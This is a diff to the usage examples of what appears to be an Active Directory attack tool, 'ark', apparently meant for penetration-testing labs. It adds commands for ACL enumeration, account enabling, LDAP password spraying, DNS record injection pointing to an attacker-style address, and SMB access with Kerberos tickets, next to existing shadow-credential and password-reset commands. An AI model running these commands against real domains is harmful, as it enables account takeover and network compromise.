@@ -47,10 +47,16 @@ eval "$(ark inbound env --port 1080)"
 ./build/ark mssql query --host INNER_SQL_IP --user U --pass-file p --windows --sql "SELECT 1"
 ./build/ark ad shadow auto --dc DC --domain D --user U --hash NT --target SAM --out t.pfx --yes
 ./build/ark ldap enum --dc DC --domain DOM --user u --pass-file p --type interesting
+./build/ark ldap enum --dc DC --domain DOM --user u --pass-file p --type acl --sam m.carter
+./build/ark ldap enable --dc DC --domain DOM --user u --pass-file p --target m.carter --yes
+./build/ark ldap spray --dc DC --domain DOM --user-file users.txt --pass-file p --delay 2s --yes
 ./build/ark ldap dangling --dc DC --domain DOM --user u --pass-file p
+./build/ark http get --url https://DC/ --user u --pass-file p --domain DOM --insecure
+./build/ark dns add --dc DC --domain DOM --user u --pass-file p --name testdns --type A --data 10.10.14.1 --yes
 ./build/ark adcs dangling --dc DC --domain DOM --user u --pass-file p
 ./build/ark rbcd show --dc DC --domain DOM --user u --pass-file p --to HOST$
 ./build/ark smb shares --host DC --anon
+./build/ark smb ls --host DC_IP --hostname dc.dom.htb --share SYSVOL --ticket ID
 ./build/ark ad password --dc DC --domain DOM --user u --pass-file p --target t --new-pass-file n
 ```
 
